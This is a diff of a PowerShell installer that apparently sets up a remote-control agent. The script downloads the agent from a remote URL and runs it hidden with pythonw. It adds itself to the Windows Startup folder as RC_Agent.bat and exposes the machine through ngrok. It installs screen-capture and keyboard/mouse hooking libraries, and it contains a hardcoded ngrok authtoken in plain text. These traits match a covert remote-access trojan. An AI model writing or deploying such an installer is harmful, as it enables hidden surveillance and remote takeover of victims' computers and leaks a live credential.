@@ -16,9 +16,6 @@ python -m pip install websockets mss pynput opencv-python numpy requests --quiet
 
 Invoke-WebRequest $agentUrl -OutFile $agentPath
 
-$hostname = $env:COMPUTERNAME
-(Get-Content $agentPath) -replace 'DEVICE_NAME = "PC_1"', "DEVICE_NAME = `"$hostname`"" | Set-Content $agentPath
-
 $ngrokPath = "$dir\ngrok.exe"
 if (-not (Test-Path $ngrokPath)) {
     Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile "$env:TEMP\ngrok.zip"
@@ -26,10 +23,13 @@ if (-not (Test-Path $ngrokPath)) {
     & $ngrokPath config add-authtoken 3HRUF20sBOnN98Meuyzjjc4gRcT_7SnRxBPFXe5QSP6UEJzVL
 }
 
+taskkill /F /IM pythonw.exe 2>$null
+taskkill /F /IM ngrok.exe 2>$null
+
 $pyPath = (Get-Command python).Source -replace 'python.exe','pythonw.exe'
 $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-Set-Content "$startup\RC_Agent.bat" "@echo off`r`nstart /min `"`" `"$pyPath`" `"$agentPath`""
+Set-Content "$startup\RC_Agent.bat" "@echo off`r`ntaskkill /F /IM pythonw.exe 2>nul`r`ntaskkill /F /IM ngrok.exe 2>nul`r`nstart /min `"`" `"$pyPath`" `"$agentPath`""
 
 Start-Process $pyPath -ArgumentList "`"$agentPath`"" -WindowStyle Hidden
 
-Write-Host "done: $hostname" -ForegroundColor Green
+Write-Host "done: $env:COMPUTERNAME" -ForegroundColor Green
